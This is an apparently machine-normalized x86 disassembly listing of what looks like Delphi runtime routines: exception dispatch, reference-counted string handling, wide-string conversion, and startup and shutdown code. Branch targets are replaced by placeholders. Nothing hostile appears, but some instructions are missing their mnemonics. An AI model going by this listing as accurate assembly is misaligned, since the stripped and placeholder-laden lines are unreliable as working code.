jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403598
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4035b8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403598
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_40361c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403088
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405eec
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403584
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403534
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403748
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403088
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403534
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405eec
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403570
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402aec
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038d0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4035b8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403908
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403ec0
sub_403930
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405eec
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403154
call sub_403518
sub_403984
call sub_405eec
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403154
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4035e0
jmp edx
sub_4039cc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b2c
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b9a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403bb4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bfa
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c54
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405c80
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c78
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405c80
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ca0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cc4
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d20
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d50
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40124c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ddc
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403cc4
call sub_403d50
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b54
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b2c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40574c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d20
push eax
call sub_401264
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403ecc
push ebp
mov ebp esp
call sub_403088
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4026fc
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403f04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403ecc
push eax
push esi
push ebx
call sub_401234
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_403f50
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026fc
pop eax
sub_403f74
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fa4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404014
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fe8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_404014
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026dc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404040
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404014
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f50
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028d8
sub_404070
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404090
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4040ac
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f50
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40459c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404070
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404070
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40459c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404040
jmp r-xdata
sub_404148
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404040
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404178
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040ac
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041c0
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404040
not ecx
sub_4041ec
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_404218
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fa4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40459c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40459c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028d8
pop edi
pop esi
pop ebx
retn
sub_40425c
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fa4
test ecx ecx
je sub_403fa4
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404218
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404014
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028d8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028d8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fa4
pop edx
pop eax
jmp sub_404218
call sub_403fa4
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042d0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404014
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40459c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028d8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fa4
dec [ edx - 0x8 ]
sub_40435c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_40441c
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404014
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026fc
sub_404470
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f50
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404040
jmp r-xdata
pop ebx
retn 0x4
sub_4044b0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_40441c#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028d8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40459c
mov edi ecx
sub_4044f8
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40459c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028d8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028d8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404554
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40459c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f50
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404014
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40271c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028d8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404648
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_40466c
test edx edx
je sub_404630
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404630
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
retn
sub_404690
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404630
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404878
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404090
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404090
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404878
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40471c
jmp r-xdata
sub_40471c
test ecx ecx
je sub_404630
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404740
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40471c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047a8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_40482c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40479c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40471c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404878
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404620
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404608
mov ebx eax
mov eax [ edi ]
call sub_40479c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
